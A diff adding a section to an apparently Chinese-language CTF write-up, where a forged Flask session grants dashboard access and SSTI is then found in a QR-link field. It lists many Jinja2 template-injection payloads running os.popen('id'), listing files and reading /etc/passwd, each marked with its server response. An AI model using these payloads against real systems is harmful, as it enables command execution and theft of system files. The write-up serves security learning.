@@ -659,4 +659,46 @@ service参数插入XSS并没有任何回显，让其访问我们的python服务�
 解码：`session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhKyFw.lx98c9k2a0pAIhcZDpC45fEJ2mY`
 将其放入请求头内，成功访问到dashboard：
 ![[Pasted image 20240408172507.png]]
-访问各个功能，在Generate I
+### SSTI
+访问各个功能，在Generate Invoice可以生成Invoice ID，在
+GenerateQR可以输入这个ID并提供报价单预览功能，而预览功能可以插入QRcode的URL：
+![[Pasted image 20240408173108.png]]
+QRlink是易受攻击的字段，点击submit预览报价单时可以发现SSTI被成功执行：
+![[Pasted image 20240408173235.png]]
+fuzz以下参数，
+```
+<<<--- 500 error responses --->>>
+
+{%25+import+os%25}{{+os.popen("ls").read()+}} <-- 500
+{%25+import+os%25}{{+os.popen("ls").read() }} <-- 500
+{%25+import+os%25}{{+os.popen("ls").read() <-- 500
+{%import%20os%}{{os.popen(%22whoami%22).read()}} <-- 500
+{%25+debug+%25} <-- 500
+{%+import+os+%} <-- 500
+{%25 import os %25} <-- 500
+{%25%20import%20os%20%25} <-- 500
+{{+''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()+}} <-- 500
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} <-- 500
+{{+self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()+}} <-- 500
+{{ lipsum.__globals__["os"].popen('id').read() }} <-- 500
+{{+lipsum.__globals__["os"].popen('id').read()+}}<-- 500
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}} <-- 500
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+{{+self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()+}}
+{{+self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read()+}}
+{{+self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()+}}
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{'abc'.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('/etc/passwd').read()}}
+{{'abc'.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('/etc/passwd').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+<<--- 200 response --->>
+
+{{config}}
+
+```
+AboutSSTI:[SSTI (Server Side Template Injection) | HackTricks | HackTricks --- SSTI（服务器端模板注入） |黑客技巧 |黑客技巧](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
